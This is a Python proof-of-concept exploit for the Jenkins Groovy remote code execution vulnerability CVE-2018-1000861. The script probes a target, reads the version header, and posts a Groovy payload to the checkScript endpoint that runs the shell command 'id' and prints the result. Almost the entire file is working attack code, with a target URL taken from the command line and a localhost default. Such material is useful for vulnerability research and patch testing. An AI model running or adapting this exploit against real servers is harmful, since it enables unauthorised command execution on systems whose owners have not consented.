#!/usr/bin/env python3
"""
Jenkins RCE (CVE-2018-1000861) PoC
Exploits dynamic routing and Groovy execution in Jenkins < 2.154
"""
import sys
import urllib.request
import urllib.parse

def exploit(target_url: str):
    print(f"[*] Target: {target_url}")
    print(f"[*] CVE-2018-1000861 - Jenkins Groovy RCE")
    print()

    check_url = f"{target_url}/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript"

    print(f"[*] Checking if Jenkins is accessible...")
    try:
        req = urllib.request.Request(f"{target_url}", method='GET')
        resp = urllib.request.urlopen(req, timeout=10)
        print(f"[+] Jenkins responded with status {resp.status}")
        headers = dict(resp.headers)
        if 'X-Jenkins' in headers:
            print(f"[+] Jenkins version: {headers['X-Jenkins']}")
    except Exception as e:
        print(f"[-] Could not reach Jenkins: {e}")
        return

    payload = 'public class x{public x(){new String("id".execute().text)}}'
    data = urllib.parse.urlencode({
        'sandbox': 'true',
        'value': payload,
    }).encode()

    print(f"[*] Sending Groovy RCE payload...")
    try:
        req = urllib.request.Request(check_url, data=data, method='POST')
        req.add_header('Content-Type', 'application/x-www-form-urlencoded')
        resp = urllib.request.urlopen(req, timeout=15)
        body = resp.read().decode('utf-8', errors='replace')
        print(f"[+] Response: {body[:1000]}")
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == '__main__':
    url = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:9030"
    exploit(url)
